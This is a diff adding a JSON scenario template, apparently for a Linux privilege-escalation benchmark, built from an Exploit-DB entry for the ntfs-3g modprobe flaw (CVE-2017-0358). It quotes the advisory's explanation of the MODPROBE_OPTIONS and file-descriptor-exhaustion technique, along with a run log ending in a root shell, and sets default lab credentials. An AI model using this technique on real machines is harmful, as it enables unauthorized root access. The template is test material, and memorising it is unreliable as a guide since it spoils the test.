@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_41356",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: ntfs-3g - Unsanitized modprobe Environment Privilege Escalation (CVE-2017-0358)\n\nExploit source code (41356.txt):\n```\nSource: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072\n\nntfs-3g is installed by default e.g. on Ubuntu and comes with a\nsetuid root program /bin/ntfs-3g. When this program is invoked on a\nsystem whose kernel does not support FUSE filesystems (detected by\nget_fuse_fstype()), ntfs-3g attempts to load the \"fuse\" module using\n/sbin/modprobe via load_fuse_module().\n\nThe issue is that /sbin/modprobe is not designed to run in a setuid\ncontext. As the manpage of modprobe explicitly points out:\n\n       The MODPROBE_OPTIONS environment variable can also be used\n       to pass arguments to modprobe.\n\nTherefore, on a system that does not seem to support FUSE filesystems,\nan attacker can set the environment variable MODPROBE_OPTIONS to\nsomething like \"-C /tmp/evil_config -d /tmp/evil_root\" to force\nmodprobe to load its configuration and the module from\nattacker-controlled directories. This allows a local attacker to load\narbitrary code into the kernel.\n\nIn practice, the FUSE module is usually already loaded. However, the\nissue can still be attacked because a failure to open\n/proc/filesystems (meaning that get_fuse_fstype() returns\nFSTYPE_UNKNOWN) always causes modprobe to be executed, even if the\nFUSE module is already loaded. An attacker can cause an attempt to\nopen /proc/filesystems to fail by exhausting the global limit on the\nnumber of open file descriptions (/proc/sys/fs/file-max).\n\nI have attached an exploit for the issue. I have tested it in a VM\nwith Ubuntu Server 16.10. To reproduce, unpack the attached file,\ncompile the exploit and run it:\n\nuser@ubuntu:~$ tar xf ntfs-3g-modprobe-unsafe.tar\nuser@ubuntu:~$ cd ntfs-3g-modprobe-unsafe/\nuser@ubuntu:~/ntfs-3g-modprobe-unsafe$ ./compile.sh\nmake: Entering directory '/usr/src/linux-headers-4.8.0-32-generic'\n  CC [M]  /home/user/ntfs-3g-modprobe-unsafe/rootmod.o\n  Building modules, stage 2.\n  MODPOST 1 modules\n  CC      /home/user/ntfs-3g-modprobe-unsafe/rootmod.mod.o\n  LD [M]  /home/user/ntfs-3g-modprobe-unsafe/rootmod.ko\nmake: Leaving directory '/usr/src/linux-headers-4.8.0-32-generic'\ndepmod: WARNING: could not open /home/user/ntfs-3g-modprobe-unsafe/depmod_tmp//lib/modules/4.8.0-32-generic/modules.order: No such file or directory\ndepmod: WARNING: could not open /home/user/ntfs-3g-modprobe-unsafe/depmod_tmp//lib/modules/4.8.0-32-generic/modules.builtin: No such file or directory\nuser@ubuntu:~/ntfs-3g-modprobe-unsafe$ ./sploit\nlooks like we won the race\ngot ENFILE at 198088 total\nFailed to open /proc/filesystems: Too many open files in system\nyay, modprobe ran!\nmodprobe: ERROR: ../libkmod/libkmod.c:514 lookup_builtin_file() could not open builtin file '/tmp/ntfs_sploit.u48sGO/lib/modules/4.8.0-32-generic/modules.builtin.bin'\nmodprobe: ERROR: could not insert 'rootmod': Too many levels of symbolic links\nError opening '/tmp/ntfs_sploit.u48sGO/volume': Is a directory\nFailed to mount '/tmp/ntfs_sploit.u48sGO/volume': Is a directory\nwe have root privs now...\nroot@ubuntu:~/ntfs-3g-modprobe-unsafe#\n```",
+  "cve": "CVE-2017-0358",
+  "exploitdb_id": "41356",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_41356",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
